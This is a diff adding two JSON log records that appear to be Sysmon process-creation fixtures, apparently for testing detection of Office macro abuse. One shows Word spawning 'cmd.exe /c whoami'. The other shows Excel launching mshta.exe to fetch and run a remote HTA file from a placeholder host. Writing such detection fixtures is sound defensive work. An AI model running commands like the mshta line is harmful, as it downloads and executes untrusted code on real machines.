@@ -1,0 +1,2 @@
+{"EventID": 1, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "CommandLine": "cmd.exe /c whoami"}
+{"EventID": 1, "Image": "C:\\Windows\\System32\\mshta.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "CommandLine": "mshta.exe http://example.test/a.hta"}
